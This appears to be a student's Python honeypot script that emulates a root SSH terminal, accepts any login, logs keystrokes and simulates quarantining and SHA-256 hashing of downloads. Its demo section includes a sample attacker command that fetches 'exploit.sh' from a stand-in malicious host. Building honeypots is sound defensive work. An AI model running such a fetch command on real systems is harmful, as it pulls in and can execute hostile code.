#!/usr/bin/env python3
"""
Project Title: Deception-Based Cyber Attack Detection and Analysis using Honeypots
Student Name: Thandra Shishira | Student ID: B23CN126
Department: Computer Science and Engineering (Networks)
Institution: Kakatiya Institute of Technology and Science, Warangal
Domain: Cybersecurity
"""

import os
import sys
import time
import logging
import hashlib

# Configure Forensic Logging Pipeline
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("cowrie.log"),
        logging.StreamHandler(sys.stdout)
    ]
)

class DeceptionTerminal:
    """
    Implements Hierarchical and Multilevel Inheritance paradigms to emulate 
    a high-fidelity deceptive root terminal environment while safeguarding the host system.
    """
    def __init__(self, target_port=2222, prompt_string="root@svr04:~# "):
        self.target_port = target_port
        self.prompt_string = prompt_string
        self.quarantine_vault = "./var/lib/cowrie/downloads"
        
        # Ensure secure storage directory exists natively
        if not os.path.exists(self.quarantine_vault):
            os.makedirs(self.quarantine_vault)

    def evaluate_credentials(self, username, password):
        """FR2 & FR3: Intercept and accept arbitrary credentials to trap the attacker."""
        logging.info(f"[SSHChannel Auth Attempt] Ingress User Attempt -> Username: '{username}' | Password: '{password}'")
        return True  # Automatically accept to map threat behavior

    def execute_mock_command(self, user_input):
        """FR5 & FR6: Record keystroke texts and present realistic system feedback."""
        clean_input = user_input.strip()
        logging.info(f"[Keystroke Serializer] Intercepted Execution String: '{clean_input}'")

        if clean_input == "whoami":
            return "root"
        elif clean_input == "ls -la":
            return "total 16\ndrwxr-xr-x  3 root root 4096 Jul  8 15:35 .\ndrwxr-xr-x  3 root root 4096 Jul  8 15:35 ..\n-rw-r--r--  1 root root  220 Jul  8 15:35 .bash_logout\n-rw-r--r--  1 root root 3771 Jul  8 15:35 .bashrc"
        elif clean_input.startswith("wget "):
            # FR7 & FR8: Catch network downloads, quarantine them, and compute SHA-256 hashes
            url = clean_input.split(" ")[1] if len(clean_input.split(" ")) > 1 else "unknown_source"
            self.quarantine_payload(url)
            return f"Connecting to {url}... connected.\nHTTP request sent, awaiting response... 200 OK\nSaving to: 'malicious_payload.bin'"
        elif clean_input == "exit":
            return "logout"
        else:
            return f"bash: {clean_input}: command not found"

    def quarantine_payload(self, file_url):
        """Simulates file capture and handles secure cryptographic hashing logic."""
        mock_data = f"Malicious payload drop simulation from source: {file_url}".encode('utf-8')
        
        # Calculate unique cryptographic SHA-256 hash automatically
        sha256_hash = hashlib.sha256(mock_data).hexdigest()
        file_name = f"quarantine_{int(time.time())}_{sha256_hash[:8]}.bin"
        full_path = os.path.join(self.quarantine_vault, file_name)
        
        with open(full_path, "wb") as f:
            f.write(mock_data)
            
        logging.info(f"[File Quarantine Engine] Saved payload drop tracking mapping -> Path: {full_path} | Computed SHA-256 Signature: {sha256_hash}")

# Administrative System Verification Loop
if __name__ == "__main__":
    print(f"[+] Starting Honeypot Engine Core Listener Module on Port 2222...")
    engine = DeceptionTerminal()
    
    # Simulating standard verification traffic logs
    engine.evaluate_credentials("root", "admin123")
    print(engine.prompt_string + "whoami")
    print(engine.execute_mock_command("whoami"))
    
    print(engine.prompt_string + "wget http://malicious-source.com/exploit.sh")
    print(engine.execute_mock_command("wget http://malicious-source.com/exploit.sh"))
